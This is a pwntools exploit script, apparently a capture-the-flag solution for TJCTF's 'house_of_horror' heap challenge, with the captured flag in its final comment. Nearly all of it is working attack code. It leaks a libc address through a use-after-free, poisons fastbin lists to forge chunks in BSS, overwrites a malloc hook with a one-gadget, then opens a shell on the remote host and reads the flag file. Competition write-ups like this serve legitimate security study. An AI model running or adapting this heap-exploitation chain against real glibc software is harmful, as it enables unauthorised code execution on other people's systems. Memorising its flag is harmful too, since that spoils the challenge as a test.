#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./f12cf5d280115f2e7ca4fc5b928e0b848436e9ccf3e42295803436f2db2dfe3c_house_of_horror')
env={}

host = args.HOST or 'p1.tjctf.org'
port = int(args.PORT or 8001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break __malloc_hook
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']

def rcv():
    io.recvuntil('>')
def sndl(s):
    io.sendline(str(s))

def add(sz):
    rcv()
    sndl(1)
    rcv()
    sndl(sz)
def rmv(idx):
    rcv()
    sndl(4)
    rcv()
    sndl(idx)
def view(idx,elm):
    rcv()
    sndl(2)
    rcv()
    sndl(idx)
    rcv()
    sndl(elm)
def edit(idx,elm,val):
    rcv()
    sndl(3)
    rcv()
    sndl(idx)
    rcv()
    sndl(elm)
    rcv()
    sndl(val)

while True:
    try:
        io=start()
        # __malloc_hook did not work (1 byte align problem
        add(100)
        add(100)
        add(100)
        rmv(1)
        view(1,0)
        addr = int(io.recvline().strip())-0x3c4b78
        log.info(hex(addr))

        libc=ELF('./libc.so')
        libc.address=addr

        #idx=3
        add(sz=0x51/8)
        #idx=4
        add(sz=0x51/8)
        rmv(4)
        rmv(3)

        log.info(hex(libc.symbols['__malloc_hook']))
        log.info(hex(libc.symbols['__free_hook']))

        edit(3,(112-16)/8-1, 0x602080+8-0x10+2)
        add(sz=0x51/8)
        add(sz=0x51/8)
        add(sz=0x51/8)

        log.info("Created fake chunk no BSS")
        edit(7, 5, 0x60 * 0x1000000000000)
        rmv(4)
        rmv(3)
        log.info("Created fake chunk on BSS (aligned)")
        edit(3,(112-16)/8-1, 0x6020e0-8-0x20)
        add(sz=0x51/8)
        add(sz=0x51/8)
        add(sz=0x51/8)


        edit(10, 0, libc.symbols['__malloc_hook'] - 0x8)
        gadget = libc.address + 0x4526a
        log.info(hex(gadget))
        edit(14, 915, gadget) # overwrite __free_hook
        sndl(4)
        rcv()
        sndl(0)
        sndl('ls && cat *flag*')
        print ("GOOOOOOOOOT SHEEEEEEEEEEEELLLLLLL")
        io.interactive()
        break
    except:
        io.close()

# tjctf{tfw_u_accidentally_leave_fastbins_in_the_binary}
